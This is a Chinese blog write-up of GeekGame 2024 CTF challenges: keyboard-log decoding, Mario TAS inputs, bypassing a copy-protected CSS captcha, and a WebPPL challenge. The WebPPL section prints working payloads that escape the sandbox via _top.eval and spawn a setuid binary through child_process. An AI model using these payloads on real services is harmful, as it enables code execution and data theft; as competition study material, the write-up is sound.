---
title: GeekGame 2024 题解 (二)
disableNunjucks: false
mathjax: false
id: 11987
date: 2024-10-19 04:14:01
categories: 
  - CTF题解
tags:
  - GeekGame
  - GeekGame 2024
cover: https://blogfiles.oss.fyz666.xyz/png/48f1d9cd-cd8c-4abd-ba92-7390d9ec1b32.png
---

本文是GeekGame 2024题解的第二部分。

## 熙熙攘攘我们的天才吧

{% hideToggle 查看题面 %} {% note primary simple %}

嫌疑人祥某，第三新燕园校区第三新物理暨化学 智能 学院诺班学生，因涉嫌在 GeekGame 中作弊被兆京大学心中算计传唤调查。

祥某称，自己家境贫寒，为了在上学期间能打工赚钱，买了很多苹果产品来提升自己的生产力。谁能料到，这使她本不富裕的生活更是雪上加霜。苹果即将发售下一代 iPhone SE，但她手中存款告急，祥某为了奖金决定参加 GeekGame 比赛。

在参赛期间，祥某用来做题的 12 寸 Macbook 突发键盘故障无法使用。祥某立即将电脑送往天才吧™维修，但得知返厂检测需要一辈子时间且不提供备用机，祥某无奈只能借同学的 Windows 电脑做题。

由于受到加利福尼亚生活方式的长期影响，祥某对 Windows 电脑严重过敏，情急之下**用自己的其他苹果设备远程串流**答题，但生产力依然十分低下，几天过去没有再做出一道题。眼看着赛程迫在眉睫，为了确保奖金到手，祥某想到自己在华清大学念书的中学同学似乎也参加了 GeekGame，遂产生了歪念头……

> “以上笔录我已看过，说得和真的一样。” —— 嫌疑人S

心中算计通过技术手段线下真实获得了祥某**作案时的流量数据**和**电脑上的日志文件**。现在请你来还原她的作案过程。

**提示：**

- 三个 Flag 分别可以通过分析键盘、视频、音频数据获得
- 如果跳过 Flag 2 直接做 Flag 3，需要知道 Flag 3 的格式是 `^flag\{\d+\}$`
- 有多名选手表示解码音频报文过于困难，但实际上转换为原始 Opus 报文 [仅需 15 行](https://github.com/PKU-GeekGame/geekgame-4th/raw/refs/heads/master/official_writeup/misc-sunshine/attachment/misc-sunshine-decrypt.py)

[本题附件](https://github.com/PKU-GeekGame/geekgame-4th/raw/refs/heads/master/official_writeup/misc-sunshine/attachment/misc-sunshine.zip)

{% endnote %}

{% endhideToggle %}

### Magic Keyboard

查看sunshine.log文件，可以找到很多keyboard事件的记录：

```raw
 [2024:09:30:17:14:29]: Debug: --begin keyboard packet--
 keyAction [00000003]
 keyCode [8074]
 modifiers [00]
 flags [00]
 --end keyboard packet--
 [2024:09:30:17:14:29]: Debug: --begin keyboard packet--
 keyAction [00000004]
 keyCode [8074]
 modifiers [00]
 ...
```

稍微研究了下，发现keyAction为3表示按下，为4表示松开，而keyCode应该就是按键的编号。但这里的keyCode看上去都不太平常，值比较大，尝试了一下发现减掉0x8000以后可以和正常的keyCode对应起来。于是写了个脚本来解析按键，得到结果如下：

```raw
 f5shifu py
 ma [shift]/
 2he 3ba 
 dage wos xuesheng ,yige xingbu [shift]/
 flag[shift][onlyapplecando[shift]]
 dengxia 
 youneigui 
 haode haod 
```

[解题脚本](https://gist.github.com/windshadow233/b7cf81c416ee8d48ea4b13ac3656f686)

## TAS概论大作业

{% hideToggle 查看题面 %} {% note primary simple %}

**【课程教材：《不时轻声地用TAS术语遮羞的马里奥同学》】**

> “21 帧规则，那个……flagpole glitch布拉琪……”
>
> “诶，什么？”
>
> “没什么，只是说了一句 ‘这家伙真是个闸总’。”
>
> “能不能停止用 [TAS](https://en.wikipedia.org/wiki/Tool-assisted_speedrun) 术语骂人？！”
>
> 坐在我旁边的那位绝世红帽大叔，马里奥的脸上浮现出了因拿到了状态而骄傲的笑容。
>
> ……但是，事实不是这样的。刚才他说的明明是“你再不 A 上去（指按 A 键）过关的时候就要放炮了”！
>
> 其实我，拥有着世界顶级的 TAS 操作，就算在实机，也可以用 1/60 秒的速度穷尽手柄按键的所有排列组合。
>
> 完全不知道这件事而且今天也用甜言蜜语来撒娇的马里奥实在是让人忍不住发笑？！
>
> 与全体 speedrunner 憧憬的、超高规格可爱的意大利水管工的 ~~青春爱情~~ 喜剧！

**【Flag 1：你过关】**

**在 600 秒内通关红白机版超级马里奥兄弟。**

需提交通关过程中的手柄输入文件。文件中的每个字节代表每帧的输入，从最低位到最高位依次表示是否按下 A、B、选择、开始、上、下、左、右键。可以使用题目提供的手柄输入编辑器完成操作（但是很难用），也可以在本地用模拟器（如 [FCEUX](https://fceux.com/)）录制输入，转换格式后上传。

手柄输入结束时，游戏必须处在 8-4 关马里奥和公主的画面。游戏 ROM、示例输入、评测脚本等见附件。

**【Flag 2：只有神知道的世界】**

**在 90 秒内进入[负世界](https://www.mariowiki.com/Minus_World)。**

手柄输入结束时，游戏必须处在任意负世界关卡（实际上这个版本的游戏里 -1 关是无限循环的，所以只能是 -1）。

**【Flag 3：诗人握持】**

没有通关条件，但是评测脚本会**将 Flag 3 附加到你的手柄输入之后。**也就是说，在播放完你的输入后，Flag 3 中的每个字节会被解释为手柄按键，逐帧输入到游戏中。请通过游戏输出的画面，分析 Flag 3 的内容。整个流程需在 300 秒内完成。

由于这个 Flag 太过逆天，除输入文件外，你还可以提交一个 2048 字节的二进制文件。模拟器在播放你的输入之前，会将其填充进红白机的 `0x0000-0x07ff` 内存处。

**提示：**

- 输入格式**不是** fm2，而是每帧一个字节，因此输入长度限制等于帧数限制，请询问长度限制的选手仔细审题
- Flag 3：看看 [Bad Apple](https://tasvideos.org/8991S)

[本题附件](https://github.com/PKU-GeekGame/geekgame-4th/raw/refs/heads/master/official_writeup/misc-mario/attachment/misc-mario.zip)

{% endnote %}

{% endhideToggle %}

以前只是听说过TAS，但自己用还是第一次，好在题目告诉我用FCEUX这个软件，少走了很多弯路。

### 你过关

只要在规定时间内通关就行了，超级玛里奥游戏的最快跳关路线是`1-1`-->`1-2`-->`4-1`-->`4-2`-->`8-1`-->`8-2`-->`8-3`，~~这里用模拟器开tas editor按上述路线逐帧打一遍就行了~~怎么可能手打啊，也太费时间了 ~~我还真tm手打通关了~~。不过我手打出来的文件好像出了点问题，传上去在一个地方直接寄了。

后来意识到可以直接去tas社区找，找到一个[大佬做的fm2文件](https://tasvideos.org/1715M)，通关只用了四分多钟，直接拿来用就行了！不过题目要求通关以后必须处在马里奥和公主的画面，所以这个文件还需要手动在最后面加几帧，让马里奥移到最后的通关位置处。

### 只有神知道的世界

这题也很简单，只要知道负世界从哪进就行了：

<img src="https://blogfiles.oss.fyz666.xyz/png/7b2a5d82-d96f-40c1-8f1a-6f93db140f4f.png" alt="image-20241019170100796" style="zoom: 33%;" />

在`1-2`的这个位置进行一个穿墙，然后原tas文件是直接往右走，这里我们改一下，去钻第一个水管即可：

<img src="https://blogfiles.oss.fyz666.xyz/png/6a9ba5a4-d933-4b85-a223-1bde7aa24d95.png" alt="image-20241019170305243" style="zoom: 33%;" />

然后就能进入到World -1:

<img src="https://blogfiles.oss.fyz666.xyz/png/d2e96dd4-916f-4006-a8a5-a182c99da71b.png" alt="image-20241019170417698" style="zoom: 33%;" />

这两题都需要把fm2转换成题目要求的二进制文件提交，故给出[转换文件](https://gist.github.com/windshadow233/6bc9e771bca1ee65826a6513073f7398)。

## 验证码

{% hideToggle 查看题面 %}
{% note primary simple %}

<img src="https://blogfiles.oss.fyz666.xyz/webp/9df3a0f7-ea2f-46fb-a4af-4fac8e09ed86.webp" alt="web-copy-captcha" style="zoom:33%;" />

<center>↑ 图四取自某 TOP2 高校内部系统</center>

不会吧，不会真有网站用 CSS 显示验证码吧？看我直接复制……诶，竟然**不许复制？**

{% endnote %}

{% endhideToggle %}

### Hard

进入网页按<kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>i</kbd>，然后发现打不开控制台，右键也被锁了，不过还有一个地方能进控制台：

<img src="https://blogfiles.oss.fyz666.xyz/png/30bc8e86-1231-4ea3-bc0c-af052dca0043.png" alt="image-20241019171425562" style="zoom: 50%;" />

进去以后找到验证码的位置，一通复制拼接，粘贴到表单`input`组件的value值里，提交即可。

<img src="https://blogfiles.oss.fyz666.xyz/png/8e1d1464-4cca-4744-bfcf-dc4b59c3dc9c.png" alt="image-20241019171558967" style="zoom:50%;" />

### Expert

验证码字符更多了，而且这里打开控制台会直接跳转到`/hacker`页面。于是我把网页的JavaScript文件下载下来，仔细研究了一下，找到了里面用于跳转到`/hacker`页面的函数删了，然后用Charles的Map Local功能把这个文件替换为响应文件，然后页面就不会跳转了。

之后只要写一个脚本把验证码内容解析出来，发个包过去就过了。（~~由于有60秒限制，这里手速要快~~）

[解题代码](https://gist.github.com/windshadow233/65a68cdf4d98828ea806c25c38f456b6)

## 概率题目概率过

{% hideToggle 查看题面 %}
{% note primary simple %}

我们极为先进的概率编程语言已经完全超越了传统编程语言。

在传统编程语言中，每个 `if` 语句只能执行一个分支，因此逐个遍历所有程序状态需要指数的时间复杂度。在概率编程语言中，你会以为每个 `if` 语句可以同时进入两个分支，从而产生它不需要指数时间复杂度的错觉，但实际上它还是会逐个遍历所有程序状态，依然需要指数的时间复杂度。

为了解决理想与实际的矛盾，WebPPL 概率编程语言创新性地选择了 JavaScript 作为宿主语言。大家都知道，JavaScript 既可以在前端运行，也可以在后端运行，这就自然地引入了概率，使得你的 payload 在被观测之前既可能打的是前端，也可能打的是后端。运行一段 WebPPL 代码就像附身为原生孙悟空，手持如意时间棒，对我们的多元宇宙发号施令。后面忘了

*↑ 上面这些怪话与解题方式并没有什么关联，就像许多其他题面一样*

**总之，你可以提交一段 WebPPL 程序，然后选择在前端或者后端运行它。**

**提示：**

- 本题跟概率编程没有什么关系。在设法实现 `eval` 后就可以不管 WebPPL 了，后面的部分是在环境中拿 Flag 的 JavaScript 编程题。
- Flag 1：如果你的注意力不够集中，浏览器开发者工具的 Heap snapshot 功能或许可以帮助你。

[WebPPL网站](http://webppl.org/)

[本题附件](https://github.com/PKU-GeekGame/geekgame-4th/raw/refs/heads/master/official_writeup/web-ppl/attachment/web-ppl-src.zip)

{% endnote %}

{% endhideToggle %}

虽然有提示，但我一开始还是被唬住了，以为要去学一个奇奇怪怪的编程语言。稍微看了一下这个语言的[文档](https://webppl.readthedocs.io/en/master/)以后，感觉好像没什么用，就没做这个题。后面第二阶段实在没题能做了，才认真看了一下，发现极其简单，确实不用学WebPPL。

### 前端开发

题目给了提示：要设法实现`eval`，但WebPPL是没有这个函数的，JavaScript倒是能`eval`，那就研究一下能不能在WebPPL里调用JavaScript函数。然后我就在文档里找到了这个：

> Note that since JavaScript functions must be called as methods on an object, it is not possible to call global JavaScript functions such as `parseInt()` directly. Instead, such functions should be called as methods on the built-in object `_top`. e.g. `_top.parseInt('0')`
>
> [文档](https://webppl.readthedocs.io/en/master/language.html#calling-javascript-functions)

按这个说法，下面的代码就可以实现`eval`：

```js
var eval = function(code){return _top.eval(code)}
```

接下来只要在环境中拿flag即可。

前端部分，程序先在代码框里运行了`console.log("flag{xxxxxx}")`，然后运行我们的代码。

这里虽然看上去flag的代码被清空了，但其实历史记录还在。为了提升注意力，我打开了Heap snapshot功能，搜了一下`flag{`，发现似乎在一个CodeMirror对象里面，但全局变量里却没有这个对象，那要怎么办呢？

问了一下GPT，GPT告诉我可以试试：

```javascript
var editor = document.querySelector('.CodeMirror').CodeMirror;
```

通过这行代码可以取出绑定在HTML组件上的`CodeMirror`对象，然后经过一通研究，发现了`getHistory`方法，于是可以写出payload：

```javascript
var eval = function(code){return _top.eval(code)}
var code = "var edi = document.querySelector('.CodeMirror').CodeMirror;" +
         "var his = edi.getHistory();" +
         "var flag = '';" +
         "his.done.forEach(function(entry) {" +
         "if (entry.changes) {" +
         "entry.changes.forEach(function(change) {" +
         "if (typeof change.text === 'object') {" +
         "if (change.text.join('').includes('flag{')) {" +
         "flag = change.text.join('');" +
         "}" +
         "}" +
         "});" +
         "}" +
         "});" +
         "document.title = flag;";
eval(code)
```

### 后端开发

给了一个shell脚本：

```bash
#!/bin/bash
set -e

chmod 600 /flag1
chmod 600 /flag2

echo '#include<stdio.h>' > ./src.c
echo 'void main() { char s[99]; puts(fgets(s, 99, fopen("/flag2", "r"))); }' >> ./src.c
gcc -o /read_flag2 src.c
chmod 4755 /read_flag2

useradd sandbox
cd /tmp
su sandbox -c 'webppl code.wppl' > /tmp/output.txt 2>&1
```

也就是说我们要写node脚本调用这个`/read_flag2`可执行文件。

**第二阶段提示：**

- Flag 2：虽然你没有 `require()`，但是你有其他的好东西，甚至包括 `import()`。

能用`import()`的话那还不简单：

```javascript
var eval = function(code){return _top.eval(code)}
var code = "async function run() {" +
    "const { exec } = await import('child_process');" +
    "exec('/read_flag2', (error, stdout, stderr) => {" +
    "if (error) {" +
    "console.error(exec error: ${error});" +
    "return;" +
    "}" +
    "console.log(stdout: ${stdout});" +
    "console.error(stderr: ${stderr});" +
    "});" +
    "}" +
    "run();"
eval(code)
```

然而`exec`在我本地能work，在服务器环境里却不行，估计是有权限什么的问题，最后换成了`spawn`就过了：

```javascript
var eval = function(code){return _top.eval(code)}
var code = "async function run() {" +
    "const { spawn } = await import('child_process');" +
    "const child = spawn('/read_flag2');" +
    "child.stdout.on('data', (data) => {" +
    "console.log(`stdout: ${data}`);" +
    "});" +
    "child.on('close', (code) => {" +
    "console.log(`child process exited with code ${code}`);" +
    "});" +
    "}" +
    "run();"
eval(code)
```
